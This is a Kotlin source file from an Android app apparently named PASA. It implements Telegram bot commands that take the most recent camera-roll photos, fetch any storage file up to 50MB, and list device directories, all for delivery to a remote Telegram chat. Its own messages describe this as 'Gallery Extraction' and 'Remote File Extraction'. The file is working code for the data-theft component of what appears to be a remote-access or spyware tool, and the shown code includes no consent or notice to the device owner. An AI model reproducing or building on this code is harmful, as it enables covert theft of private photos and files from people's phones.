package com.izhaanintellect.pasa.commands

import android.content.ContentUris
import android.content.Context
import android.os.Build
import android.os.Environment
import android.provider.MediaStore
import android.util.Log
import com.izhaanintellect.pasa.bot.TelegramApi
import com.izhaanintellect.pasa.data.PreferencesManager
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Handles remote storage inspection, file downloading, and camera roll extraction.
 *
 * Usage:
 *   /gallery_latest [count]   (extract 1-10 most recent photos directly to Telegram)
 *   /getfile <path>           (download any storage file up to 50MB)
 *   /list_files [directory]   (browse files in directory)
 */
@Singleton
class StorageAccessCommand @Inject constructor(
    @ApplicationContext private val context: Context,
    private val telegramApi: TelegramApi,
    private val preferencesManager: PreferencesManager
) : Command {

    override val name = "/gallery_latest"
    override val description = "Extract recent gallery photos or download files from storage"
    override val usage = "/gallery_latest [count] | /getfile <path> | /list_files [dir]"

    companion object {
        private const val TAG = "PASA_StorageAccess"
        private const val MAX_UPLOAD_BYTES = 50 * 1024 * 1024L // 50MB Telegram Bot API limit
    }

    override suspend fun execute(args: List<String>, chatId: Long): CommandResult {
        return executeGalleryLatest(args, chatId)
    }

    suspend fun executeGalleryLatest(args: List<String>, chatId: Long): CommandResult = withContext(Dispatchers.IO) {
        val requestedCount = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 10) ?: 3

        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.DATE_ADDED,
            MediaStore.Images.Media.SIZE
        )

        val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
        val tempFiles = mutableListOf<File>()

        try {
            val cursor = context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                sortOrder
            )

            if (cursor == null || !cursor.moveToFirst()) {
                cursor?.close()
                return@withContext CommandResult(
                    success = false,
                    message = "📁 <b>No Gallery Photos Found:</b> MediaStore returned 0 images or storage permission is required."
                )
            }

            val idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            val dateColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)

            var count = 0
            val cacheDir = File(context.cacheDir, "gallery_temp").apply { mkdirs() }

            do {
                val id = cursor.getLong(idColumn)
                val displayName = cursor.getString(nameColumn) ?: "photo_${id}.jpg"
                val dateAdded = cursor.getLong(dateColumn) * 1000L
                val dateStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date(dateAdded))

                val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)

                // Copy stream to temp cache file for transmission
                val tempFile = File(cacheDir, "pasa_gal_${id}_$displayName")
                try {
                    context.contentResolver.openInputStream(contentUri)?.use { input ->
                        FileOutputStream(tempFile).use { output ->
                            input.copyTo(output)
                        }
                    }
                    if (tempFile.exists() && tempFile.length() > 0) {
                        tempFiles.add(tempFile)
                        count++
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Failed to read image id $id: ${e.message}")
                }
            } while (cursor.moveToNext() && count < requestedCount)

            cursor.close()

            if (tempFiles.isEmpty()) {
                return@withContext CommandResult(false, "❌ Failed to read recent photos from device storage.")
            }

            // Return all extracted photos in photoFiles so CommandExecutor handles resilient multi-photo delivery
            CommandResult(
                success = true,
                message = "🖼️ <b>Gallery Extraction Completed:</b> Delivered $count recent photo(s) from camera roll.",
                photoFile = tempFiles.firstOrNull(),
                photoFiles = tempFiles
            )
        } catch (e: Exception) {
            Log.e(TAG, "Gallery extraction failed: ${e.message}", e)
            CommandResult(false, "❌ <b>Gallery Extraction Error:</b> ${e.localizedMessage ?: e.message}")
        }
    }

    suspend fun executeGetFile(args: List<String>, chatId: Long): CommandResult = withContext(Dispatchers.IO) {
        if (args.isEmpty()) {
            return@withContext CommandResult(
                success = false,
                message = """
                    📁 <b>Remote File Extraction</b>
                    ━━━━━━━━━━━━━━━━━━━━
                    Extract any file from internal or external storage directly to Telegram.

                    ⚠️ <b>Usage:</b>
                    • <code>/getfile &lt;absolute_path&gt;</code>

                    <b>Examples:</b>
                    • <code>/getfile /sdcard/Download/document.pdf</code>
                    • <code>/getfile /sdcard/DCIM/Camera/IMG_001.jpg</code>

                    ℹ️ <i>Telegram Bot API supports file uploads up to 50MB.</i>
                """.trimIndent()
            )
        }

        val path = args.joinToString(" ").trim()
        val file = File(path)

        if (!file.exists()) {
            return@withContext CommandResult(
                success = false,
                message = "❌ <b>File Not Found:</b> <code>$path</code> does not exist on the device."
            )
        }

        if (file.isDirectory) {
            return@withContext CommandResult(
                success = false,
                message = "❌ <b>Target is a Directory:</b> Use <code>/list_files $path</code> to browse its contents."
            )
        }

        if (!file.canRead()) {
            return@withContext CommandResult(
                success = false,
                message = "❌ <b>Permission Denied:</b> Cannot read <code>$path</code>. Ensure storage permissions are granted."
            )
        }

        val sizeBytes = file.length()
        if (sizeBytes > MAX_UPLOAD_BYTES) {
            val sizeMb = String.format(Locale.US, "%.1f", sizeBytes / (1024.0 * 1024.0))
            return@withContext CommandResult(
                success = false,
                message = "❌ <b>File Too Large:</b> File size ($sizeMb MB) exceeds Telegram's 50MB upload limit."
            )
        }

        val sizeFormatted = formatFileSize(sizeBytes)
        val isImage = listOf("jpg", "jpeg", "png", "webp", "gif").any { file.extension.equals(it, ignoreCase = true) }

        if (isImage) {
            CommandResult(
                success = true,
                message = "🖼️ <b>File Extracted:</b> <code>${file.name}</code> ($sizeFormatted)",
                photoFile = file
            )
        } else {
            CommandResult(
                success = true,
                message = "📄 <b>File Extracted:</b> <code>${file.name}</code> ($sizeFormatted)",
                documentFile = file
            )
        }
    }

    suspend fun executeListFiles(args: List<String>): CommandResult = withContext(Dispatchers.IO) {
        val defaultDir = File(Environment.getExternalStorageDirectory(), "DCIM/Camera")
        val targetPath = if (args.isNotEmpty()) args.joinToString(" ").trim() else defaultDir.absolutePath
        val dir = File(targetPath)

        if (!dir.exists()) {
            // Fallback to SD card root if default DCIM doesn't exist
            val fallback = Environment.getExternalStorageDirectory()
            if (args.isEmpty() && fallback.exists()) {
                return@withContext listDirectory(fallback)
            }
            return@withContext CommandResult(false, "❌ <b>Directory Not Found:</b> <code>$targetPath</code>")
        }

        if (!dir.isDirectory) {
            return@withContext CommandResult(false, "❌ <code>$targetPath</code> is a file, not a directory. Use <code>/getfile</code>.")
        }

        return@withContext listDirectory(dir)
    }

    private fun listDirectory(dir: File): CommandResult {
        val files = dir.listFiles()
        if (files == null) {
            return CommandResult(false, "❌ Unable to read directory <code>${dir.absolutePath}</code>. Check permissions.")
        }

        val sorted = files.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))
        val sb = StringBuilder("📁 <b>Directory Listing:</b> <code>${dir.absolutePath}</code>\n━━━━━━━━━━━━━━━━━━━━\n")

        val totalShown = sorted.take(25)
        for (f in totalShown) {
            val modDate = SimpleDateFormat("MM-dd HH:mm", Locale.US).format(Date(f.lastModified()))
            if (f.isDirectory) {
                val childCount = f.list()?.size ?: 0
                sb.append("📁 <b>${f.name}/</b>  [<i>$childCount items</i>, $modDate]\n")
            } else {
                val size = formatFileSize(f.length())
                sb.append("📄 <code>${f.name}</code>  ($size, $modDate)\n")
            }
        }

        if (files.size > 25) {
            sb.append("\n<i>...and ${files.size - 25} more items.</i>")
        }

        sb.append("\n💡 <i>To download a file: <code>/getfile &lt;full_path&gt;</code></i>")
        return CommandResult(success = true, message = sb.toString())
    }

    private fun formatFileSize(bytes: Long): String {
        return when {
            bytes >= 1024 * 1024 -> String.format(Locale.US, "%.1f MB", bytes / (1024.0 * 1024.0))
            bytes >= 1024 -> "${bytes / 1024} KB"
            else -> "$bytes B"
        }
    }
}
